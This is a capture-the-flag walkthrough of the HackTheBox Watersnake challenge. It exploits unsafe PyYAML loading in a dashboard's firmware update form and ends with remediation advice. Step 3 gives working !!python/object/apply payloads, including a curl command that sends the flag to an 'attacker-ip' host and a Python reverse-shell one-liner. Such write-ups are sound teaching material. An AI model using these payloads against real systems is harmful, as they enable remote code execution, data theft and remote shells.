---
title: "HackTheBox Watersnake Challenge: YAML Deserialization to RCE"
description: "Complete walkthrough of the HackTheBox Watersnake challenge - exploiting a YAML deserialization vulnerability in a water tank monitoring dashboard's firmware update feature."
date: 2024-11-07
difficulty: Medium
tags: [hackthebox, yaml-deserialization, web, ctf, python]
---

## Challenge Overview

Watersnake presents a web application - a water tank monitoring dashboard showing real-time stats (temperature, pressure, water level). The dashboard has three sections: a monitoring view, an about page, and a **Firmware Update** page that accepts YAML-formatted update instructions.

## Reconnaissance

The dashboard itself is straightforward - HTML/CSS with some JavaScript for the stats visualization. The about page contains nothing interesting. But the Firmware Update page is immediately suspicious: it accepts user input in YAML format.

```
Firmware Update
Submit update instructions in YAML format:
[textarea]
[Submit]
```

Whenever you see a web application parsing user-supplied YAML, your first thought should be **YAML deserialization attacks**. Python's `PyYAML` library (with `yaml.load()` using `Loader=yaml.FullLoader` or the unsafe `Loader`) is notoriously vulnerable to object instantiation.

## Understanding YAML Deserialization

Python's PyYAML supports constructing arbitrary Python objects from YAML tags. The `!!python/object/apply` tag calls any Python callable with specified arguments:

```yaml
!!python/object/apply:os.system
args: ['id']
```

When `yaml.load()` processes this, it literally calls `os.system('id')` - that's remote code execution.

### Safe vs Unsafe Loaders

| Loader | Arbitrary Objects | Safe |
|--------|:---:|:---:|
| `yaml.FullLoader` | Limited | Partially |
| `yaml.UnsafeLoader` | Yes | No |
| `yaml.Loader` | Yes | No |
| `yaml.SafeLoader` | No | Yes |
| `yaml.safe_load()` | No | Yes |

## Exploitation

### Step 1: Confirm YAML Parsing

First, submit valid YAML to confirm the server processes it:

```yaml
name: test
version: 1.0
```

The server responds with a success message, confirming YAML parsing is happening server-side.

### Step 2: Test for Deserialization

Try a Python object construction payload:

```yaml
!!python/object/apply:os.popen
args: ['id']
```

If the server returns a response indicating command execution (even if indirect), we have RCE.

### Step 3: Extracting the Flag

Since this is a blind execution environment (we can't see stdout directly), we need to exfiltrate the output. Several approaches work:

**Approach A: Read flag and return in response**

```yaml
!!python/object/apply:subprocess.check_output
args: [['cat', '/flag.txt']]
```

If the application reflects the YAML processing result, the flag appears in the response.

**Approach B: Out-of-band exfiltration**

If the response isn't reflected, use curl or wget to send the flag to our server:

```yaml
!!python/object/apply:os.system
args: ['curl http://attacker-ip:8080/$(cat /flag.txt | base64)']
```

**Approach C: Reverse shell**

For full interactive access:

```yaml
!!python/object/apply:os.system
args: ['python3 -c "import socket,subprocess,os;s=socket.socket();s.connect(("attacker-ip",4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call(["/bin/sh","-i"])"']
```

### Step 4: Success

The `subprocess.check_output` approach returned the flag content directly in the application's response. Flag captured.

## Root Cause Analysis

The vulnerability exists because the application uses `yaml.load()` with an unsafe loader to parse user-supplied firmware update instructions. The developer likely intended to parse simple key-value configuration data but used the default unsafe loader instead of `yaml.safe_load()`.

## Remediation

1. **Always use `yaml.safe_load()`** - never `yaml.load()` with untrusted input
2. If you need to parse complex YAML structures, use `yaml.FullLoader` (still has some risks) or better, define a custom schema and validate input before parsing
3. Run the application with minimal privileges (non-root, restricted filesystem access)
4. Implement input validation - firmware update instructions should have a defined schema, not accept arbitrary YAML

## Key Takeaways

- YAML deserialization is as dangerous as Java serialization or Python pickle
- Any web feature that accepts YAML, JSON with type hints, or serialized data is a prime target
- The `!!python/object/apply` tag is the PyYAML equivalent of `Runtime.exec()` in Java deserialization
- Always test YAML input fields with object construction payloads during web assessments

> Whenever you see YAML input in a web application, test for deserialization immediately. It's one of the quickest paths to RCE in Python applications.
